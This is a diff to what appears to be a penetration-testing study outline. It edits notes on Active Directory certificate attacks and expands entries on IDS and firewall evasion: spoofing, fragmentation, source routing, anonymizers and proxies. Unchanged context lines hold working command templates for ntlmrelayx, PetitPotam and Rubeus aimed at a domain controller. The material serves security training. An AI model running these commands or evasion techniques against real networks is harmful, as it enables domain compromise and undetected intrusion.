@@ -3495,7 +3495,7 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 					=> ntlmrelayx.py -t <URL of Certificate Authority with web enrollment> -smb2support --adcs --template DomainController
 				- To force authentication using the captured credentials via the MS-EFSRPC API call, run:
 					=> python3 PetitPotam.py -d <CA name> -u <Username> -p <Password> <Listener-IP> <IP of DC>
-				- If the DC is vulnerable, you can launch PetitPotam without credentials to receive the certificate’s NTLM hashes by running:
+				- If the DC is vulnerable, can launch PetitPotam without credentials to receive the certificate’s NTLM hashes by running:
 					=> python3 PetitPotam.py <Attacker’s IP> <IP of DC>
 				- After obtaining the NTLM hashes, use password-cracking tools like Rubeus to request a Kerberos ticket for the machine containing DC account privileges:
 					=> Rubeus.exe asktgt /outfile:<output_file.kirbi> /dc:<DC-IP> /domain:<domain name> /user:<Domain username> /ptt /certificate:<NTLM hashes received from above command>
@@ -3584,7 +3584,7 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 		- Regularly update antivirus software to prevent malware from stealing cookies.
 		- Avoid accessing sensitive accounts or making financial transactions over public Wi-Fi.
 		- Disable auto-connect to open Wi-Fi networks.
-		- Keep your operating system, browsers, and plugins up to date.
+		- Keep operating system, browsers, and plugins up to date.
 		- Use encrypted messaging and email services for sensitive communication.
 		- Avoid saving passwords in browsers.
 		- Use incognito mode on shared computers.
@@ -3864,13 +3864,51 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 			- Firewalking is a method used to collect information about remote networks behind firewalls. It is a technique that utilizes TTL (Time to Live) values to determine gateway ACL (Access Control List) filters and map networks by analyzing the response of IP packets. It probes ACLs on packet-filtering routers and firewalls using a method similar to tracerouting. Firewalking involves sending TCP or UDP packets into the firewall where the TTL value is one hop greater than the targeted firewall. If the packet passes through the gateway, the system forwards it to the next hop, where the TTL equals one, and prompts an ICMP error message at the point of rejection, with a "TTL exceeded in transit" message. This method helps locate a firewall, and additional probing can facilitate fingerprinting and identification of vulnerabilities.
 			- The detailed information obtained from firewalking can also assist attackers in crafting more precise and stealthy attack strategies, potentially aiding in IDS evasion. Understanding firewall rules can help attackers avoid detection by exploiting allowed ports and protocols, thereby reducing the likelihood of triggering IDS alerts.
 			- Firewalk is a well-known tool used for firewalking. It has two phases: a network discovery phase and a scanning phase. It is available in various open-source Linux distributions. Nmap also includes a firewalk script that can be used to perform firewalking. Both Firewalk and the Nmap firewalk scripts provide critical insights into network configurations and firewall rules that can be leveraged to bypass security measures, including IDS, when combined with other evasion techniques.
-		- Banner Grabbing
-		- IP Address Spoofing
-		- Source Routing
-		- Tiny Fragments
-		- Using an IP Address in Place of a URL
-		- Using Anonymous Website Surfing Sites
-		- Using a Proxy Server
+		- Banner Grabbing:
+			- Banners are service announcements provided by applications in response to connection requests, often containing vendor and version information. Banner grabbing is a simple fingerprinting technique used to identify the vendor and firmware version of a firewall or other network services. Knowing the exact firmware or server version allows attackers to craft payloads that exploit known vulnerabilities while avoiding IDS detection patterns.
+			- Banner grabbing helps identify the services running on a system. The information obtained can include details about IDS configurations and the target system’s setup. Attackers use this knowledge to understand how an IDS is configured and tailor their actions to evade known detection rules. Additionally, banner grabbing can reveal services running on firewalls. The three primary services that send banners are FTP, Telnet, and web servers.
+			- A firewall does not block banner grabbing because the connection between the attacker’s system and the target appears legitimate. Banner grabbing is used to extract banner and application information. For instance, when a user opens a Telnet connection to a known port on the target server and presses Enter a few times, the server may display a response revealing its service details.
+			- Many applications respond to connections on specific ports, making them susceptible to banner grabbing. The information obtained can help attackers refine their strategy to further compromise the system. By knowing the web server's vendor and version, an attacker can focus on platform-specific exploit techniques. Services running on ports such as FTP, Telnet, and web servers should not remain open unless necessary, as they are vulnerable to banner grabbing.
+		- IP Address Spoofing:
+			- IP address spoofing is a technique used by attackers to evade firewalls and Intrusion Detection Systems (IDS) by masquerading as trusted sources. This method involves altering the source IP address in packet headers to conceal the attacker's true identity and bypass security measures. Firewalls and IDS often filter packets based on their source IP addresses to determine whether they originate from legitimate or malicious sources. Attackers create IP packets with forged source addresses, making them appear as though they were sent by a trusted host. By modifying the IP packet header, attackers can deceive the destination host into believing the packet originates from a reliable source.
+			- IP spoofing helps attackers hide their true IP addresses, making it difficult for security systems to trace the origin of an attack. By spoofing trusted IP addresses, attackers can gain unauthorized access to systems and networks. Spoofed IP addresses also allow attackers to evade IDS detection, as some systems filter out traffic only from known malicious sources.
+			- Many firewalls filter traffic based on IP addresses. By spoofing an IP address, attackers can bypass these filters and gain access to protected networks. IDS solutions also monitor packets from legitimate sources, but attackers can circumvent these defenses using spoofed IP addresses. This technique is commonly used in spamming, phishing, and denial-of-service (DoS) attacks. Tools such as Hping allow attackers to create custom packets with forged IP addresses.
+		- Source Routing:
+			- Source routing is a technique in which the sender of a packet specifies the route it should take through the network. Attackers use this method to direct packets through less-secured, less-monitored, or alternative network segments where IDS/firewall solutions are either partially implemented or absent. This approach helps attackers reduce the likelihood of triggering IDS alerts and logging access attempts.
+			- As packets travel through the network, each router typically examines the destination IP address and determines the next hop to forward the packet. However, in source routing, the sender makes some or all of these routing decisions instead of allowing the network to handle them dynamically.
+			- Source routing is categorized into two types:
+				- Loose Source Routing: The sender specifies one or more intermediate nodes that the packet must pass through, but routers can still determine other parts of the route.
+				- Strict Source Routing: The sender dictates the exact route the packet must follow, and routers must adhere to this predefined path.
+		- Tiny Fragments:
+			- Attackers create tiny fragments of outgoing packets, forcing some of the TCP packet’s header information into the next fragment. This fragmentation makes it difficult for an Intrusion Detection System (IDS) to reassemble the full traffic stream, which is essential for detecting malicious patterns effectively. Since IDS filter rules rely on recognizing specific patterns, they may fail to match fragmented packets due to the broken header information.
+			- The attack succeeds if the filtering router inspects only the first fragment and allows the remaining fragments to pass unchecked. This technique is commonly used to bypass user-defined filtering rules and is particularly effective when a firewall examines only TCP header information without reassembling the full packet.
+		- Bypassing Blocked Sites Using an IP Address Instead of a URL:
+			- This method involves entering a blocked website’s IP address directly into the browser’s address bar instead of using its domain name. For example, to access Facebook, a user can type its IP address instead of its domain name.
+			- Services such as Host2IP can help users find the IP address of a blocked website. However, this method may fail if the blocking software monitors and restricts access based on the IP address rather than just the domain name.
+		- Bypassing Blocked Sites Using Anonymous Web-Surfing Services:
+			- Anonymous web-surfing sites allow users to browse the internet anonymously and access blocked websites, bypassing firewall restrictions. These sites help users visit restricted pages without revealing their IP address. Some anonymous browsing services also offer the option to encrypt website URLs for added security.
+			- A proxy service can be used to access blocked websites. These proxy websites hide the user’s actual IP address and display a different one, preventing websites from detecting and blocking access.
+			- Anonymize VPN (anonymize.com): Anonymize VPN routes all internet traffic through an encrypted tunnel, securing connections from the user’s device to protected servers and networks. It also masks the real IP address, ensuring continuous anonymity for all online activities.
+			- Online Anonymizers:
+				- anonymize.com
+				- 2ip.io/anonim
+				- www.kproxy.com
+				- zendproxy.com
+				- proxify.com
+				- www.proxysite.com
+				- anonymouse.org
+				- proxyscrape.com
+		- Bypassing IDS/Firewall Using Proxy Server:
+			- Find a suitable proxy server.
+			- Configure proxy settings on a Windows system:
+				- Open the Control Panel and navigate to Network and Internet → Internet Options.
+				- In the Internet Options dialog box, go to the Connections tab and click "LAN settings."
+			- Under LAN Settings, check the "Use a proxy server for your LAN" option.
+			- In the Address box, enter the IP address of the proxy server.
+			- In the Port box, enter the port number used by the proxy server for client connections (default: 8080).
+			- (Optional) Check "Bypass proxy server for local addresses" if you do not want the proxy server to be used for local network connections.
+			- Click OK to close the LAN Settings dialog box.
+			- Click OK again to close the Internet Options dialog box.
 		- ICMP Tunneling
 		- ACK Tunneling
 		- HTTP Tunneling
